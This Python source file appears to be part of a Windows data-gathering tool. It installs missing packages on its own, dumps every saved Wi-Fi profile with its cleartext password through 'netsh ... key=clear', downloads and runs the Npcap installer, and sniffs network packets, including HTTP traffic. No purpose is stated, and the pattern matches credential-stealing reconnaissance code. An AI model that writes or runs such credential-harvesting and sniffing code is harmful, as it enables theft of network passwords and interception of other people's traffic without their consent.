import os
import pip

try:
    import requests
except:
    pip.main(['install', 'requests'])
    import requests

try:
    import psutil
except:
    pip.main(['install', 'psutil'])
    import psutil

try:
    import ifcfg
except:
    pip.main(['install', 'ifcfg'])
    import ifcfg

import subprocess
import socket
import sys
import struct

try:
    from scapy.all import *
    # Import IP, TCP, UDP, and ICMP
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply
    from scapy.layers.http import HTTPRequest, HTTPResponse
except:
    pip.main(['install', 'scapy'])
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6EchoReply
    from scapy.layers.http import HTTPRequest, HTTPResponse


def getInterfaces():
    return ifcfg.interfaces()


def getNetworkProfiles():
    # Use the powershell terminal and run: netsh wlan show profiles. Then for each profile run: netsh wlan show profile <profile_name> key=clear
    # This will show the password for each network
    # Make all that into a JSON format, then return it all.

    # Get all the profiles
    profiles = subprocess.check_output(
        ["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
    profiles = [i.split(":")[1][1:-1]
                for i in profiles if "All User Profile" in i]

    # Get all the passwords
    data = []
    # Data Format: [{"name": "profile_name", "password": "password", "extra": {... the rest}}]

    for profile in profiles:
        try:
            results = subprocess.check_output(
                ["netsh", "wlan", "show", "profile", profile, "key=clear"]).decode("utf-8").split("\n")
            results = [i.split(":")[1][1:-1]
                       for i in results if "Key Content" in i]
            data.append({"name": profile, "password": results[0]})
        except:
            pass

    return data


def downloadNpcap():
    with requests.get("https://npcap.com/dist/npcap-1.78.exe") as r:
        with open("npcap-1.78.exe", "wb") as f:
            f.write(r.content)


def installNpcap():
    # Run the npcap installer
    subprocess.Popen("npcap-1.78.exe", shell=True)

    # Wait for the installer to finish
    while not os.path.exists("C:\\Program Files\\Npcap\\NPFInstall.exe"):
        time.sleep(1)


def getMoreInternet(time):
    # Check if npcap is installed
    if not os.path.exists("C:\\Program Files\\Npcap\\NPFInstall.exe"):
        # Download npcap
        downloadNpcap()

        # Run the npcap installer
        installNpcap()

    # Get all the packets
    packets = sniff(timeout=time)

    tcp = [i for i in packets if i.haslayer(TCP)]
    udp = [i for i in packets if i.haslayer(UDP)]
    icmp = [i for i in packets if i.haslayer(ICMP)]
    http = [i for i in packets if i.haslayer(
        HTTPRequest) or i.haslayer(HTTPResponse)]
    ipv6 = [i for i in packets if i.haslayer(IPv6)]

    return {"tcp": tcp, "udp": udp, "icmp": icmp, "http": http, "ipv6": ipv6}
